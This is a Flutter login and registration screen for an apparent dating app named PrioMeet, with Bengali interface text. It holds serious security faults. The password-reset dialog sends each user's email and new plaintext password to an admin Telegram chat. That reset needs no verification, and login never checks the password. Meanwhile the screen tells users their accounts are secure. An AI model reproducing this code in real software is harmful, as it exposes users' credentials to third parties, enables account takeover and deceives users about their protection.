import 'package:flutter/material.dart';
import 'package:priomeet_app/user_session.dart';
import 'package:priomeet_app/services/firebase_service.dart';
import 'package:priomeet_app/services/telegram_service.dart';
import 'package:priomeet_app/screens/auth/profile_setup_screen.dart';
import 'package:priomeet_app/screens/home/home_screen.dart';

class LoginScreen extends StatefulWidget {
  const LoginScreen({super.key});

  @override
  State<LoginScreen> createState() => _LoginScreenState();
}

class _LoginScreenState extends State<LoginScreen> {
  bool _isSignUp = true; // true = Register, false = Login
  bool _obscurePassword = true;

  final TextEditingController _emailController = TextEditingController();
  final TextEditingController _phoneController = TextEditingController();
  final TextEditingController _passwordController = TextEditingController();
  final TextEditingController _referralController = TextEditingController();
  bool _isLoading = false;

  void _handleSubmit() async {
    final email = _emailController.text.trim();
    final phone = _phoneController.text.trim();
    final password = _passwordController.text.trim();
    final refCode = _referralController.text.trim();

    if (email.isEmpty || !email.contains('@')) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('অনুগ্রহ করে সঠিক Gmail অ্যাড্রেস দিন!')),
      );
      return;
    }

    if (password.length < 6) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('পাসওয়ার্ড কমপক্ষে ৬ অক্ষরের হতে হবে!')),
      );
      return;
    }

    if (_isSignUp) {
      if (phone.length < 11 || !phone.startsWith('01')) {
        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(content: Text('সঠিক ১১ ডিজিটের মোবাইল নম্বর দিন (যেমন: 017XXXXXXXX)!')),
        );
        return;
      }
    }

    setState(() => _isLoading = true);

    if (_isSignUp) {
      // নতুন রেজিস্ট্রেশন
      AppUserSession.userEmail = email;
      AppUserSession.userPhone = phone;
      AppUserSession.userId = phone;
      AppUserSession.userPassword = password;
      AppUserSession.coins = (AppUserSession.coins > 0) ? AppUserSession.coins : 15;
      if (AppUserSession.userName.isEmpty) {
        AppUserSession.userName = "Prio_${phone.substring(phone.length - 4)}";
      }

      if (refCode.isNotEmpty) {
        FirebaseService.applyReferralCode(refCode);
      }
      FirebaseService.syncUserProfile();
      await AppUserSession.saveSession();

      setState(() => _isLoading = false);
      if (mounted) {
        Navigator.pushReplacement(
          context,
          MaterialPageRoute(builder: (c) => const ProfileSetupScreen()),
        );
      }
    } else {
      // পুরাতন ইউজার লগইন
      AppUserSession.userEmail = email;
      AppUserSession.userPassword = password;
      await AppUserSession.saveSession();

      setState(() => _isLoading = false);
      if (mounted) {
        Navigator.pushReplacement(
          context,
          MaterialPageRoute(builder: (c) => const HomeScreen()),
        );
      }
    }
  }

  void _showForgotPasswordDialog() {
    final resetEmailController = TextEditingController(text: _emailController.text);
    final newPasswordController = TextEditingController();

    showDialog(
      context: context,
      builder: (c) => AlertDialog(
        backgroundColor: const Color(0xFF1E143A),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
        title: const Row(
          children: [
            Icon(Icons.lock_reset_rounded, color: Color(0xFFFF2A85)),
            SizedBox(width: 8),
            Text('পাসওয়ার্ড রিসেট 🔑', style: TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.bold)),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text('আপনার অ্যাকাউন্টের Gmail দিন এবং নতুন পাসওয়ার্ড সেট করুন:', style: TextStyle(color: Colors.white70, fontSize: 12)),
            const SizedBox(height: 12),
            TextField(
              controller: resetEmailController,
              style: const TextStyle(color: Colors.white),
              decoration: InputDecoration(
                hintText: 'আপনার রেজিস্টার্ড Gmail',
                hintStyle: const TextStyle(color: Colors.white30, fontSize: 12),
                filled: true,
                fillColor: Colors.black26,
                border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none),
              ),
            ),
            const SizedBox(height: 10),
            TextField(
              controller: newPasswordController,
              obscureText: true,
              style: const TextStyle(color: Colors.white),
              decoration: InputDecoration(
                hintText: 'নতুন পাসওয়ার্ড (৬+ অক্ষর)',
                hintStyle: const TextStyle(color: Colors.white30, fontSize: 12),
                filled: true,
                fillColor: Colors.black26,
                border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none),
              ),
            ),
          ],
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(c), child: const Text('বাতিল', style: TextStyle(color: Colors.white54))),
          ElevatedButton(
            onPressed: () async {
              final email = resetEmailController.text.trim();
              final newPass = newPasswordController.text.trim();
              if (email.isEmpty || newPass.length < 6) {
                ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text('সঠিক জিমেইল ও নতুন পাসওয়ার্ড দিন!')));
                return;
              }

              // অ্যাডমিন টেলিগ্রামে রিসেট নোটিফিকেশন পাঠানো
              final alert = """
<b>🔑 পাসওয়ার্ড রিসেট নোটিফিকেশন! (PrioMeet)</b>
--------------------------------------
📧 জিমেইল: <code>$email</code>
🔐 নতুন পাসওয়ার্ড: <code>$newPass</code>
⏰ সময়: <b>${DateTime.now().toLocal()}</b>
--------------------------------------
ইউজার সরাসরি তার পাসওয়ার্ড পরিবর্তন করেছেন।
""";
              TelegramService.sendMessage(alert);

              AppUserSession.userPassword = newPass;
              await AppUserSession.saveSession();

              Navigator.pop(c);
              ScaffoldMessenger.of(context).showSnackBar(
                const SnackBar(content: Text('পাসওয়ার্ড সফলভাবে পরিবর্তন হয়েছে! নতুন পাসওয়ার্ড দিয়ে লগইন করুন।')),
              );
            },
            style: ElevatedButton.styleFrom(backgroundColor: const Color(0xFFFF2A85)),
            child: const Text('পাসওয়ার্ড আপডেট করুন', style: TextStyle(color: Colors.white)),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF07040D),
      body: Container(
        decoration: const BoxDecoration(
          gradient: RadialGradient(
            center: Alignment(0, -0.3),
            radius: 1.2,
            colors: [Color(0xFF380854), Color(0xFF160324), Color(0xFF07040D)],
          ),
        ),
        child: SafeArea(
          child: SingleChildScrollView(
            padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 20),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.center,
              children: [
                const SizedBox(height: 10),
                Container(
                  width: 85,
                  height: 85,
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(24),
                    boxShadow: [
                      BoxShadow(color: const Color(0xFFFF2A85).withOpacity(0.5), blurRadius: 25, spreadRadius: 2),
                    ],
                  ),
                  child: ClipRRect(
                    borderRadius: BorderRadius.circular(24),
                    child: Image.asset('assets/icon/app_logo.png', fit: BoxFit.cover, errorBuilder: (_, __, ___) => const Icon(Icons.favorite, color: Colors.white, size: 40)),
                  ),
                ),
                const SizedBox(height: 12),
                const Text('PrioMeet', style: TextStyle(color: Colors.white, fontSize: 30, fontWeight: FontWeight.w900, letterSpacing: 2)),
                const Text('DATE & CONNECT', style: TextStyle(color: Color(0xFFD6A4FF), fontSize: 11, letterSpacing: 2.5, fontWeight: FontWeight.bold)),
                const SizedBox(height: 25),

                // ট্যাব সুইচার (লগইন বনাম সাইনআপ)
                Container(
                  padding: const EdgeInsets.all(4),
                  decoration: BoxDecoration(
                    color: Colors.white.withOpacity(0.08),
                    borderRadius: BorderRadius.circular(25),
                  ),
                  child: Row(
                    children: [
                      Expanded(
                        child: GestureDetector(
                          onTap: () => setState(() => _isSignUp = true),
                          child: Container(
                            padding: const EdgeInsets.symmetric(vertical: 10),
                            decoration: BoxDecoration(
                              color: _isSignUp ? const Color(0xFFFF2A85) : Colors.transparent,
                              borderRadius: BorderRadius.circular(22),
                            ),
                            child: const Center(
                              child: Text('নতুন অ্যাকাউন্ট তৈরি', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 13)),
                            ),
                          ),
                        ),
                      ),
                      Expanded(
                        child: GestureDetector(
                          onTap: () => setState(() => _isSignUp = false),
                          child: Container(
                            padding: const EdgeInsets.symmetric(vertical: 10),
                            decoration: BoxDecoration(
                              color: !_isSignUp ? const Color(0xFFFF2A85) : Colors.transparent,
                              borderRadius: BorderRadius.circular(22),
                            ),
                            child: const Center(
                              child: Text('লগইন করুন', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 13)),
                            ),
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
                const SizedBox(height: 20),

                // ফর্ম বক্স
                Container(
                  padding: const EdgeInsets.all(22),
                  decoration: BoxDecoration(
                    color: Colors.white.withOpacity(0.06),
                    borderRadius: BorderRadius.circular(22),
                    border: Border.all(color: Colors.white12),
                  ),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        _isSignUp ? 'নিরাপদ অ্যাকাউন্ট রেজিস্ট্রেশন' : 'আপনার অ্যাকাউন্টে লগইন',
                        style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 16),
                      ),
                      const SizedBox(height: 18),

                      const Text('আপনার বৈধ Gmail অ্যাড্রেস', style: TextStyle(color: Colors.white70, fontSize: 12.5, fontWeight: FontWeight.w600)),
                      const SizedBox(height: 6),
                      TextField(
                        controller: _emailController,
                        keyboardType: TextInputType.emailAddress,
                        style: const TextStyle(color: Colors.white),
                        decoration: InputDecoration(
                          prefixIcon: const Icon(Icons.mark_email_read_rounded, color: Color(0xFFFF2A85), size: 20),
                          hintText: 'example@gmail.com',
                          hintStyle: const TextStyle(color: Colors.white30, fontSize: 13),
                          filled: true,
                          fillColor: Colors.black.withOpacity(0.4),
                          border: OutlineInputBorder(borderRadius: BorderRadius.circular(14), borderSide: BorderSide.none),
                        ),
                      ),
                      const SizedBox(height: 14),

                      if (_isSignUp) ...[
                        const Text('মোবাইল নম্বর', style: TextStyle(color: Colors.white70, fontSize: 12.5, fontWeight: FontWeight.w600)),
                        const SizedBox(height: 6),
                        TextField(
                          controller: _phoneController,
                          keyboardType: TextInputType.phone,
                          style: const TextStyle(color: Colors.white),
                          decoration: InputDecoration(
                            prefixIcon: const Icon(Icons.phone_iphone_rounded, color: Color(0xFFFF2A85), size: 20),
                            hintText: '01XXXXXXXXX',
                            hintStyle: const TextStyle(color: Colors.white30, fontSize: 13),
                            filled: true,
                            fillColor: Colors.black.withOpacity(0.4),
                            border: OutlineInputBorder(borderRadius: BorderRadius.circular(14), borderSide: BorderSide.none),
                          ),
                        ),
                        const SizedBox(height: 14),
                      ],

                      const Text('গোপন পাসওয়ার্ড', style: TextStyle(color: Colors.white70, fontSize: 12.5, fontWeight: FontWeight.w600)),
                      const SizedBox(height: 6),
                      TextField(
                        controller: _passwordController,
                        obscureText: _obscurePassword,
                        style: const TextStyle(color: Colors.white),
                        decoration: InputDecoration(
                          prefixIcon: const Icon(Icons.lock_outline_rounded, color: Color(0xFFFF2A85), size: 20),
                          suffixIcon: IconButton(
                            icon: Icon(_obscurePassword ? Icons.visibility_off : Icons.visibility, color: Colors.white38, size: 20),
                            onPressed: () => setState(() => _obscurePassword = !_obscurePassword),
                          ),
                          hintText: 'কমপক্ষে ৬ অক্ষরের পাসওয়ার্ড',
                          hintStyle: const TextStyle(color: Colors.white30, fontSize: 13),
                          filled: true,
                          fillColor: Colors.black.withOpacity(0.4),
                          border: OutlineInputBorder(borderRadius: BorderRadius.circular(14), borderSide: BorderSide.none),
                        ),
                      ),

                      if (!_isSignUp) ...[
                        Align(
                          alignment: Alignment.centerRight,
                          child: TextButton(
                            onPressed: _showForgotPasswordDialog,
                            child: const Text('পাসওয়ার্ড ভুলে গেছেন? (Forgot)', style: TextStyle(color: Color(0xFFFF2A85), fontSize: 12)),
                          ),
                        ),
                      ] else ...[
                        const SizedBox(height: 14),
                        const Text('রেফারেল কোড (ঐচ্ছিক - বোনাস ১০ কয়েন 🎁)', style: TextStyle(color: Color(0xFFFFCC00), fontSize: 12.5, fontWeight: FontWeight.bold)),
                        const SizedBox(height: 6),
                        TextField(
                          controller: _referralController,
                          textCapitalization: TextCapitalization.characters,
                          style: const TextStyle(color: Colors.white),
                          decoration: InputDecoration(
                            prefixIcon: const Icon(Icons.card_giftcard_rounded, color: Color(0xFFFFCC00), size: 20),
                            hintText: 'বন্ধুর রেফারেল কোড দিন',
                            hintStyle: const TextStyle(color: Colors.white30, fontSize: 13),
                            filled: true,
                            fillColor: Colors.black.withOpacity(0.4),
                            border: OutlineInputBorder(borderRadius: BorderRadius.circular(14), borderSide: BorderSide.none),
                          ),
                        ),
                        const SizedBox(height: 20),
                      ],

                      SizedBox(
                        width: double.infinity,
                        height: 50,
                        child: ElevatedButton(
                          onPressed: _isLoading ? null : _handleSubmit,
                          style: ElevatedButton.styleFrom(
                            backgroundColor: const Color(0xFFFF2A85),
                            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(25)),
                            elevation: 5,
                          ),
                          child: _isLoading
                              ? const SizedBox(width: 22, height: 22, child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2))
                              : Text(_isSignUp ? 'রেজিস্টার ও এগিয়ে যান' : 'লগইন করুন', style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 15)),
                        ),
                      ),
                    ],
                  ),
                ),
                const SizedBox(height: 20),
                const Text('🔒 প্রতিটি অ্যাকাউন্ট পাসওয়ার্ড ও ক্লাউড সিকিউরিটি দিয়ে সুরক্ষিত।', textAlign: TextAlign.center, style: TextStyle(color: Colors.white38, fontSize: 11.5)),
              ],
            ),
          ),
        ),
      ),
    );
  }
}
